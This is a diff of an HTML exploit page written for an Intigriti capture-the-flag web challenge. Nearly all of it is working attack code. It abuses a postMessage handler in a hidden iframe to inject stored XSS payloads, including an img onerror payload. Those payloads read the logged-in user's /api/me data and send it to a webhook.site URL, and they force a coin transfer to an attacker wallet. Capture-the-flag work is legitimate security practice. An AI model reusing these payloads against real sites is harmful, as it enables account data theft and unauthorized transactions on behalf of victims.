@@ -2,11 +2,10 @@
 <html>
 <head><title>FINAL</title></head>
 <body>
-<h1>FINAL EXPLOIT</h1>
 <div id="log"></div>
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/8d285b50-124c-4618-8edc-57595e5c4652';
+const W = 'https://webhook.site/896da21b-1bb4-4622-a737-fe81ac2bf9d6';
 const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
 let s = 0;
 
@@ -15,7 +14,7 @@ function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+']
 async function exploit() {
     log('STARTING');
 
-    // Load checkout.html in iframe (has postMessage handler and admin cookies)
+    // Load checkout in iframe
     log('Loading checkout...');
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
@@ -26,24 +25,56 @@ async function exploit() {
     await new Promise(r => setTimeout(r, 3000));
     log('Checkout loaded');
 
-    // Send transaction with XSS payload in address
-    log('Sending transaction with XSS...');
+    // First: Send coin to target wallet
+    log('Sending 1 coin to target wallet...');
     iframe.contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
-            toAddress: `');fetch('${W}/?xss=dashboard',{mode:'no-cors'});fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${W}/?FLAG='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'}));fetch('${T}/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({toAddress:'${WALLET}',currency:'1337COIN',amount:1})}).then(()=>fetch('${W}/?COIN_SENT',{mode:'no-cors'}));//`,
+            toAddress: WALLET,
+            currency: '1337COIN',
+            amount: 1
+        }
+    }, '*');
+    log('Coin sent');
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    // Second: Send XSS payload to marketwatch (nickname field or address)
+    log('Sending XSS payload to marketwatch...');
+    const xssPayload = `<img src=x onerror="fetch('${W}/?XSS_MARKETWATCH=1',{mode:'no-cors'});fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${W}/?FLAG='+btoa(JSON.stringify(d)),{mode:'no-cors'}))">`;
+
+    iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+            toAddress: xssPayload,
             currency: '1337COIN',
             amount: 0
         }
     }, '*');
-    log('Transaction sent');
+    log('XSS payload sent as address');
 
-    await new Promise(r => setTimeout(r, 3000));
+    await new Promise(r => setTimeout(r, 2000));
 
-    // Now open dashboard where XSS will trigger
-    log('Opening dashboard to trigger XSS...');
-    window.open(T + '/dashboard.html', '_blank');
-    log('DONE');
+    // Check if transactions exist
+    log('Checking marketwatch...');
+    try {
+        const mw = await fetch(T + '/api/marketwatch', {credentials: 'include'});
+        const mwData = await mw.json();
+        log('Marketwatch has ' + mwData.length + ' transactions');
+        // Send marketwatch data to webhook for debugging
+        fetch(W + '/?marketwatch=' + encodeURIComponent(JSON.stringify(mwData.slice(0,3))), {mode:'no-cors'});
+    } catch(e) {
+        log('Error: ' + e.message);
+    }
+
+    // Keep user on same page - redirect to marketwatch after delay
+    log('Redirecting to marketwatch in 3s...');
+    setTimeout(() => {
+        log('Redirecting now...');
+        window.location.href = T + '/marketwatch.html';
+    }, 3000);
+
+    log('WAITING for redirect...');
 }
 
 setTimeout(exploit, 1000);
